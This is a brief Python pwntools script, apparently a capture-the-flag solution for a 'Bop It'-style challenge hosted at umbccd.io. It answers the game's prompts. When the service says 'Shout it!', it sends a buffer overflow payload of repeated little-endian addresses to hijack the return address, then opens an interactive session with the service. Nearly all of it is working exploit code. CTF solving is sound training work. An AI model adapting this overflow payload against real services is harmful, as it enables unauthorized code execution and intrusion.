from pwn import *

nc = remote('umbccd.io',4100)
intro = nc.recv()
print(str(intro) + '\n')
nc.sendline('B')
recv = nc.recv()
print(str(recv) + '\n')
i=True
while(i==True):
    if(recv == b'BOF it!\n'):
        print(str(recv) + '\n')
        nc.sendline('B')
    elif(recv == b'Pull it!\n'):
        print(str(recv) + '\n')
        nc.sendline('P')
    elif(recv == b'Twist it!\n'):
        print(str(recv) + '\n')
        nc.sendline('T')
    elif(recv == b'Shout it!\n'):
        print(str(recv) + '\n')
        exploit = (10*'V\x12@\x00\x00\x00\x00\x00')
        nc.sendline(exploit)
        i=False
        nc.interactive()
    recv = nc.recv()